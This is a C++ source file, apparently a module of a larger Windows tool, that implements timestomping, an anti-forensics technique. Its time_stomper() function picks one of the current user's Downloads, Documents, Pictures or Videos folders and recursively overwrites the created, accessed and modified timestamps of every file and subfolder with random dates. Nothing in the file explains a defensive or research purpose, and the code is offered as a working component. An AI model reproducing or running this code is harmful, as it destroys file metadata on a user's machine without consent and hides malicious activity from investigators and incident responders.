
#include <windows.h>
#include <string>
#include <random>
#include <stdlib.h>
#include <modules/time-stomper.hpp>

WORD devurandom( int range_min, int range_max)  
{  
   // Generate random numbers in the half-closed interval  
   // [range_min, range_max). In other words,  
   // range_min <= random number < range_max  
    int u = (double)rand() / (RAND_MAX + 1) * (range_max - range_min) + range_min;  
	WORD out = (WORD) u;
	return out;
}  

//Generate random SYSTEMTIME
SYSTEMTIME SYSTEMTIME_rand()
{   
    //SYSTEMTIME STUCT
    //wYear , wMonth, wDayofWeek (NULL), wDay, wHour, wMinute, wSecond, wMilliSeconds
	SYSTEMTIME st = { devurandom(2010,2022), devurandom(1,12), 0, devurandom(1,31), devurandom(0,23), devurandom(0,59), devurandom(0,59), devurandom(1,999)};
	return st;
}

void timestomp(std::string path, SYSTEMTIME m_st, SYSTEMTIME a_st, SYSTEMTIME c_st, int m_flag, int a_flag, int c_flag)
{
	HANDLE hHandle;
	FILETIME m_ft = {};
	FILETIME a_ft = {};
	FILETIME c_ft = {};
    m_st = SYSTEMTIME_rand();
	a_st = SYSTEMTIME_rand();
	c_st = SYSTEMTIME_rand();
	//Convert SYSTEMTIME to FILETIME, if time isn't specified keep current filetime
	if (m_flag == 1)
		SystemTimeToFileTime(&m_st, &m_ft);
	else
	{
		m_ft.dwLowDateTime = 0;
		m_ft.dwHighDateTime = 0;
	}
	if (a_flag == 1)
		SystemTimeToFileTime(&a_st, &a_ft);
	else
	{
		a_ft.dwLowDateTime = 0;
		a_ft.dwHighDateTime = 0;
	}
	if (c_flag == 1)
		SystemTimeToFileTime(&c_st, &c_ft);
	else
	{
		c_ft.dwLowDateTime = 0;
		c_ft.dwHighDateTime = 0;
	}
	
	//Get file handle
	hHandle = CreateFileA(path.c_str(), FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
        printf("CreateFileA() Failed on %s.\n", path.c_str());
		//cout << "CreateFileA() fail on " << path << "." << " SYSTEM ERROR: " << GetLastError() << "\n"
        
	//Modify time
	if (SetFileTime(hHandle, &c_ft, &a_ft, &m_ft) == 0) {
        printf("SetFileTime() failed. \n");
    }
		//wcout << "SetFileTime() fail. SYSTEM ERROR: " << GetLastError() << "\n";
	else {
        printf("SetFileTime() success on %s .\n", path.c_str());
    }
		//cout << "SetFileTime() success on " << path << endl; //DEBUG ONLY
}

DWORD timestomp_recursive(std::string path, SYSTEMTIME m_st, SYSTEMTIME a_st, SYSTEMTIME c_st, int m_flag, int a_flag, int c_flag, int r_flag)
{
	std::string path_patch = path + "\\*";
	WIN32_FIND_DATAA w32fd;
	HANDLE hSearch = FindFirstFileA(path_patch.c_str(), &w32fd);

	//Check search handle created successfully
	if (hSearch != INVALID_HANDLE_VALUE)
		;
	else if (hSearch == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == 5) //Skip access denied
		{
			return 1;
		}
        printf("Invalid handle value for path: %s .\n", path_patch);
        printf("GetLastError: %s.\n", GetLastError());
		return 0;
	}

	//If (directory), else (file)
	if (w32fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
	{
		if ((std::string(w32fd.cFileName) != ".") && (std::string(w32fd.cFileName) != "..")) 
		{
			std::string current_file = path + "\\" + w32fd.cFileName;
			timestomp(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag);
			//Recurse through all sub-folders
			if (r_flag)
			{
				if (timestomp_recursive(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag, r_flag) == 0)
					return 0;
			}
		}
	}
	else
	{
		std::string current_file = path + "\\" + w32fd.cFileName;
		timestomp(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag);
	}

	//If (directory), else (file)
	while (FindNextFileA(hSearch, &w32fd) != 0)
	{
		if(w32fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if ((std::string(w32fd.cFileName) != ".") && (std::string(w32fd.cFileName) != "..")) 
			{
				std::string current_file = path + "\\" + w32fd.cFileName;
				timestomp(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag);
				//Recurse through all sub-folders
				if (r_flag)
				{
					if (timestomp_recursive(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag, r_flag) == 0)
						return 0;
				}
			}
		}
		else
		{
			std::string current_file = path + "\\" + w32fd.cFileName;
			timestomp(current_file, m_st, a_st, c_st, m_flag, a_flag, c_flag);
		}
	}
	return 1;
}

void time_stomper(){
	std::string username = getenv("username");
	const char *dirs[4] = {"Downloads", "Documents", "Pictures", "Videos"};
	std::string path = "C:\\Users\\" + username + "\\" +  dirs[rand() % 4];
    SYSTEMTIME m_st;
	SYSTEMTIME a_st;
	SYSTEMTIME c_st;
    // Edit Last Modified Flag
	int m_flag = 1;
    // Edit Last Accessed Flag
	int a_flag = 1;
    // Edit Last Created Flag
	int c_flag = 1;
    // Directory Recursive Flag
    int r_flag = 1;
    // Last Modified System Time
    m_st = SYSTEMTIME_rand();
    // Last Accessed System Time
	a_st = SYSTEMTIME_rand();
	// Last Created System Time
    c_st = SYSTEMTIME_rand();
    // Modify Directory Time Stamp
    timestomp(path, m_st, a_st, c_st, m_flag, a_flag, c_flag);
    // Modify Nested Directory / Files Time Stamp
	timestomp_recursive(path, m_st, a_st, c_st, m_flag, a_flag, c_flag, r_flag);

}